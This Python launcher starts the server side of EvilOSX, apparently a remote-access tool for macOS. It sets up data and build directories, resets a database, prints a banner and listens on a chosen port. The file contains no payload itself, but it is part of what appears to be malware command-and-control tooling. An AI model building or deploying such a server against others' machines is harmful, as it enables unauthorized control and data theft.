#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Starts the server using the MVC pattern."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

from argparse import ArgumentParser
from os import path, mkdir, remove

from server.controller import Controller
from server.model import Model
from server.modules.helper import DATA_DIRECTORY
from server.version import VERSION
from server.view import View

BANNER = """\
▓█████ ██▒   █▓ ██▓ ██▓     ▒█████    ██████ ▒██   ██▒
▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▒  ██▒▒██    ▒ ▒▒ █ █ ▒░
▒███   ▓██  █▒░▒██▒▒██░    ▒██░  ██▒░ ▓██▄   ░░  █   ░
▒▓█  ▄  ▒██ █░░░██░▒██░    ▒██   ██░  ▒   ██▒ ░ █ █ ▒ 
░▒████▒  ▒▀█░  ░██░░██████▒░ ████▓▒░▒██████▒▒▒██▒ ▒██▒  @{} (v{})
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░
 ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░░░   ░▒ ░
   ░       ░░   ▒ ░  ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░    ░  
   ░  ░     ░   ░      ░  ░    ░ ░        ░   ░    ░  
""".format(__author__, VERSION)

MESSAGE_INPUT = "[\033[1m?\033[0m] "
MESSAGE_INFO = "[\033[94mI\033[0m] "
MESSAGE_ATTENTION = "[\033[91m!\033[0m] "


def setup():
    """Creates the required directories used by the server."""
    directories = [
        DATA_DIRECTORY,
        path.join(DATA_DIRECTORY, "builds"),
        path.join(DATA_DIRECTORY, "output")
    ]
    database_path = path.join(DATA_DIRECTORY, "EvilOSX.db")

    for directory in directories:
        if not path.exists(directory):
            mkdir(directory)

    if path.exists(database_path):
        # For if we make any changes to the database (model).
        remove(path.join(DATA_DIRECTORY, "EvilOSX.db"))


def main():
    setup()

    try:
        print(BANNER)
    except UnicodeEncodeError:
        # Thrown on my Raspberry PI (via SSH).
        print(MESSAGE_ATTENTION + "Failed to print fancy banner, skipping...")

    parser = ArgumentParser()
    parser.add_argument("-p", "--port", help="server port to listen on", type=int)
    arguments = parser.parse_args()
    
    if arguments.port:
        server_port = arguments.port
    else:
        while True:
            try:
                server_port = int(input(MESSAGE_INPUT + "Server port to listen on: "))
                break
            except ValueError:
                continue

    model = Model()
    view = View()
    Controller(view, model, server_port)

    # Start the view, blocks until exit.
    view.start()

    print(MESSAGE_INFO + "Feel free to submit any issues or feature requests on GitHub.")
    print(MESSAGE_INFO + "Goodbye!")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + MESSAGE_ATTENTION + "Interrupted.")
